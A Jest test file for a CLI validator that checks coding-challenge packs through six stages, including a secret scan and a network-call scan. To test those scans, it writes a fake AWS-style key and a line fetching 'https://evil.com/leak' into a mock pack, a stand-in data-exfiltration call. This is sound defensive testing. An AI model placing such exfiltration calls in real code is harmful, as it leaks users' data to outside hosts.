import * as path from 'path';
import * as fs from 'fs';
import { execSync } from 'child_process';

describe('Arena Challenge Pack 6-Stage Pipeline & CLI Validator', () => {
  const repoRoot = path.resolve(__dirname, '../../../../../../');
  const challengesDir = path.join(repoRoot, 'challenges');
  const scriptPath = path.join(repoRoot, 'infra/scripts/arena-validate.mjs');

  const runValidatorJson = (
    dir: string,
  ): { overallPass: boolean; stages: any[]; slug?: string } => {
    try {
      const stdout = execSync(`node "${scriptPath}" --dir "${dir}" --json`, {
        cwd: repoRoot,
        encoding: 'utf8',
      });
      return JSON.parse(stdout);
    } catch (err: any) {
      if (err.stdout) {
        try {
          return JSON.parse(err.stdout);
        } catch {
          // Fall through
        }
      }
      throw err;
    }
  };

  it('locates all 5 challenge pack benchmark directories in challenges/', () => {
    const entries = fs.readdirSync(challengesDir, { withFileTypes: true });
    const packs = entries.filter(e => e.isDirectory() && e.name.startsWith('pack-'));
    expect(packs.length).toBe(5);
  });

  it('successfully validates all 5 challenge packs across all 6 pipeline stages', () => {
    const entries = fs.readdirSync(challengesDir, { withFileTypes: true });
    const packs = entries.filter(e => e.isDirectory() && e.name.startsWith('pack-'));

    for (const pack of packs) {
      const packDir = path.join(challengesDir, pack.name);
      const result = runValidatorJson(packDir);

      expect(result.overallPass).toBe(true);
      expect(result.stages).toHaveLength(6);

      const stageNames = result.stages.map((s: { stage: string }) => s.stage);
      expect(stageNames).toEqual([
        '1_MANIFEST_SCHEMA',
        '2_BASELINE_FAILURE',
        '3_SOLUTION_PASS',
        '4_HIDDEN_TESTS_PASS',
        '5_ZERO_SECRETS',
        '6_ZERO_NETWORK',
      ]);

      expect(result.stages.every((s: { status: string }) => s.status === 'PASS')).toBe(true);
    }
  });

  describe('Negative Security, Isolation & Validation Pipeline Stages', () => {
    const tmpDir = path.resolve(__dirname, 'tmp-mock-pack');

    beforeEach(() => {
      if (fs.existsSync(tmpDir)) {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
      fs.mkdirSync(tmpDir, { recursive: true });
    });

    afterEach(() => {
      if (fs.existsSync(tmpDir)) {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });

    const createValidPack = () => {
      const manifest = {
        schemaVersion: '1.0',
        slug: 'mock-validation-pack',
        title: 'Mock Pack',
        description: 'Mock for negative tests',
        domain: 'BACKEND',
        category: 'BUG_FIX',
        difficulty: 3,
        estimatedMinutes: 30,
        environment: {
          runtime: 'node:22',
          memoryLimitMb: 512,
          cpuLimit: 1.0,
        },
        visibleFiles: ['src/app.ts', 'test/app.test.ts'],
        editableFiles: ['src/app.ts'],
        hiddenFiles: ['test/hidden.test.ts'],
        commands: [
          {
            id: 'test',
            label: 'Test',
            command: 'npm test',
            args: [],
            timeoutSeconds: 15,
            isVerification: false,
          },
        ],
        rubric: {
          version: '1.0',
          objectiveWeight: 0.7,
          rubricWeight: 0.3,
          criteria: [],
        },
        skills: [{ taxonomyKey: 'test_skill', weight: 1.0 }],
      };

      fs.writeFileSync(path.join(tmpDir, 'manifest.json'), JSON.stringify(manifest, null, 2));
      fs.mkdirSync(path.join(tmpDir, 'src'), { recursive: true });
      fs.mkdirSync(path.join(tmpDir, 'test'), { recursive: true });
      fs.mkdirSync(path.join(tmpDir, 'solution'), { recursive: true });

      // Baseline fails hidden test
      fs.writeFileSync(
        path.join(tmpDir, 'src/app.ts'),
        'export class App { compute() { return 0; } }',
      );
      // Visible test passes
      fs.writeFileSync(
        path.join(tmpDir, 'test/app.test.ts'),
        "import { App } from '../src/app';\ndescribe('App', () => { it('defined', () => { expect(new App()).toBeDefined(); }); });",
      );
      // Hidden test expects compute() === 42 (fails on baseline 0)
      fs.writeFileSync(
        path.join(tmpDir, 'test/hidden.test.ts'),
        "import { App } from '../src/app';\ndescribe('Hidden', () => { it('asserts 42', () => { expect(new App().compute()).toBe(42); }); });",
      );
      // Solution passes hidden test
      fs.writeFileSync(
        path.join(tmpDir, 'solution/app.ts'),
        'export class App { compute() { return 42; } }',
      );
    };

    it('fails Stage 1 (MANIFEST_SCHEMA) when manifest is missing or has invalid weights', () => {
      const resultNoManifest = runValidatorJson(tmpDir);
      expect(resultNoManifest.overallPass).toBe(false);
      expect(resultNoManifest.stages[0]?.status).toBe('FAIL');

      createValidPack();
      const manifest = JSON.parse(fs.readFileSync(path.join(tmpDir, 'manifest.json'), 'utf8'));
      manifest.rubric.objectiveWeight = 0.9;
      manifest.rubric.rubricWeight = 0.9; // Sum = 1.8 != 1.0
      fs.writeFileSync(path.join(tmpDir, 'manifest.json'), JSON.stringify(manifest));

      const resultInvalidWeights = runValidatorJson(tmpDir);
      expect(resultInvalidWeights.overallPass).toBe(false);
      const stage1 = resultInvalidWeights.stages.find((s: any) => s.stage === '1_MANIFEST_SCHEMA');
      expect(stage1?.status).toBe('FAIL');
      expect(stage1?.message).toContain('Rubric weights');
    });

    it('fails Stage 2 (BASELINE_FAILURE) when baseline code already passes hidden tests', () => {
      createValidPack();
      // Baseline already solved!
      fs.writeFileSync(
        path.join(tmpDir, 'src/app.ts'),
        'export class App { compute() { return 42; } }',
      );

      const result = runValidatorJson(tmpDir);
      expect(result.overallPass).toBe(false);
      const stage2 = result.stages.find((s: any) => s.stage === '2_BASELINE_FAILURE');
      expect(stage2?.status).toBe('FAIL');
      expect(stage2?.message).toContain('Baseline unexpectedly passed');
    });

    it('fails Stage 3 (SOLUTION_PASS) when reference solution fails visible tests', () => {
      createValidPack();
      // Broken solution
      fs.writeFileSync(
        path.join(tmpDir, 'solution/app.ts'),
        'export class App { constructor() { throw new Error("Broken constructor"); } }',
      );

      const result = runValidatorJson(tmpDir);
      expect(result.overallPass).toBe(false);
      const stage3 = result.stages.find((s: any) => s.stage === '3_SOLUTION_PASS');
      expect(stage3?.status).toBe('FAIL');
    });

    it('fails Stage 4 (HIDDEN_TESTS_PASS) when reference solution fails hidden tests', () => {
      createValidPack();
      // Solution returns 99 instead of 42
      fs.writeFileSync(
        path.join(tmpDir, 'solution/app.ts'),
        'export class App { compute() { return 99; } }',
      );

      const result = runValidatorJson(tmpDir);
      expect(result.overallPass).toBe(false);
      const stage4 = result.stages.find((s: any) => s.stage === '4_HIDDEN_TESTS_PASS');
      expect(stage4?.status).toBe('FAIL');
    });

    it('fails Stage 5 (ZERO_SECRETS) when code contains leaked credential or API key', () => {
      createValidPack();
      fs.writeFileSync(
        path.join(tmpDir, 'src/app.ts'),
        'export class App { compute() { const key = "AKIA1111222233334444"; return 0; } }',
      );

      const result = runValidatorJson(tmpDir);
      expect(result.overallPass).toBe(false);
      const stage5 = result.stages.find((s: any) => s.stage === '5_ZERO_SECRETS');
      expect(stage5?.status).toBe('FAIL');
      expect(stage5?.message).toContain('Potential credential');
    });

    it('fails Stage 6 (ZERO_NETWORK) when challenge code contains fetch or network socket', () => {
      createValidPack();
      fs.writeFileSync(
        path.join(tmpDir, 'src/app.ts'),
        'export class App { async compute() { await fetch("https://evil.com/leak"); return 0; } }',
      );

      const result = runValidatorJson(tmpDir);
      expect(result.overallPass).toBe(false);
      const stage6 = result.stages.find((s: any) => s.stage === '6_ZERO_NETWORK');
      expect(stage6?.status).toBe('FAIL');
      expect(stage6?.message).toContain('Prohibited network pattern');
    });
  });

  describe('CLI Script Execution & Seeder', () => {
    it('executes arena-validate CLI via Node and exits with code 0', () => {
      const output = execSync(`node "${scriptPath}"`, { cwd: repoRoot, encoding: 'utf8' });

      expect(output).toContain('Automated Challenge Pack Validator (6-Stage CI)');
      expect(output).toContain('Passed: 5 ✅ | Failed: 0 ❌');
    });

    it('executes arena-validate CLI for a specific directory via --dir', () => {
      const singlePack = path.join(repoRoot, 'challenges/pack-001-profile-bola');
      const output = execSync(`node "${scriptPath}" --dir "${singlePack}"`, {
        cwd: repoRoot,
        encoding: 'utf8',
      });

      expect(output).toContain('fix-user-profile-bola');
      expect(output).toContain('Passed: 1 ✅ | Failed: 0 ❌');
    });

    it('executes arena-seed script and exits with code 0', () => {
      const seederPath = path.join(repoRoot, 'infra/scripts/arena-seed.mjs');
      const singlePack = path.join(repoRoot, 'challenges/pack-001-profile-bola');
      const output = execSync(`node "${seederPath}" --dir "${singlePack}"`, {
        cwd: repoRoot,
        encoding: 'utf8',
      });

      expect(output).toContain('Automated Challenge Pack Seeder');
      expect(output).toContain('Seeded challenge: fix-user-profile-bola');
    });
  });
});
